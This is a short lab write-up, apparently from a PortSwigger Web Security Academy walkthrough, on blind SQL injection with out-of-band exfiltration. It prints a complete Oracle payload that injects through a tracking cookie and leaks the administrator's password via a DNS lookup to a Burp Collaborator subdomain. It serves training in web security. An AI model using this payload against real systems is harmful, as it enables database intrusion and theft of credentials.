14. Blind SQL injection with out-of-band data exfiltration</a>

This web application handles SQL queries asynchronously, making it difficult to
detect the results of a SQL injection attack. This includes trying to determine
the type of SQL database in use. To solve this, we eventually use the Oracle XXE
vulnerability to trigger a DNS lookup. This lab requires the use of
PortSwigger's Burp Suite Professional distribution, however, in a real
engagement you could always create your own DNS server to capture the DNS
lookup. We append the password of the administrator as a subdomain to our domain
that we're using to capture DNS requests, allowing us to exfil the password.
Here's the payload:

```
TrackingId=dtBu3jq1O29SviC6'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
